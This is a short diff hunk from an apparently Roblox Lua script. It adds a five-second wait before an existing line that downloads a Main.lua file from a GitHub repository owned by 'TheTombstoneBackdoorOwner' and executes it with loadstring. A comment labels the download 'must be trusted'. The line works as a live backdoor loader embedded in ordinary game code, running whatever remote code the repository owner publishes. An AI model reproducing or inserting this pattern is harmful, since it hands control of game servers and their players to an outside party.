@@ -126,6 +126,7 @@ end)
 
 -- Load external script (must be trusted)
 local success, err = pcall(function()
+		wait(5)
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/FUCK/refs/heads/main/Main.lua", true))()
 end)
 
